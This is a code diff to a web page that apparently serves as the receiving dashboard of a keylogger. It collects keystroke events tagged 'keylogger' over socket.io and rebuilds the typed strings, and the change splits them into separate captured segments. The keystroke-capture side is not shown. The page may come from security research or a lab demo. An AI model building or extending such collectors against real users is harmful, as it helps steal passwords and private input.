@@ -44,10 +44,12 @@
 <div class="_blank"></div>
 <script>
     const keys = [];
+    var buildStrings = [];
     let startPattern = null;
     let startPatternTime = Infinity;
     let endPattern = null;
     let endPatternTime = -Infinity;
+    var recordIdx = 0;
 
     function createDom(keyValue, prefix = "_") {
         let div = document.createElement("div");
@@ -75,16 +77,22 @@
         return null;
     }
 
-    function rebuildString(keys) {
+    function rebuildString(startIndex) {
         const BUILD_FAILED = "build failed";
+        let part_keys = keys.slice(startIndex);
+        console.log(part_keys);
         if (startPattern && endPattern) {
-            let cleanedKeys = keys.filter(item => item.indexOf("_") < 0);
+            let cleanedKeys = part_keys.filter(item => item.indexOf("_") < 0);
             if (cleanedKeys.length === 0) {
                 return startPattern[0];
             }
             let startKey = getStartKey(startPattern, cleanedKeys);
             let cur = startKey;
             let res = [];
+            if(cur == null)
+            {
+                return "No Start Key";
+            }
             let visited = new Set();
             visited.add(cur);
             while (cur) {
@@ -116,14 +124,30 @@
         }
     }
 
+    function displayResults() {
+        console.log(recordIdx);
+        buildStrings.push(rebuildString(recordIdx));
+        document.getElementById("rebuild-result").innerText = buildStrings.join(',');
+        recordIdx = keys.length;
+        console.log(recordIdx);
+    }
+
     window.onload = () => {
         const socket = io();
         socket.on("UPDATE", (data) => {
+            console.log(data);
             if (data.site && data.site === "keylogger") {
-                createDom(data.payload);
-                updatePatterns(data);
-                keys.push(data.payload);
-                document.getElementById("rebuild-result").innerText = rebuildString(keys);
+                if(data.action !== undefined)
+                {
+                    displayResults();
+                }
+                else
+                {
+                    createDom(data.payload);
+                    updatePatterns(data);
+                    keys.push(data.payload);
+                }
+                // document.getElementById("rebuild-result").innerText = rebuildString(keys);
             }
         })
     };
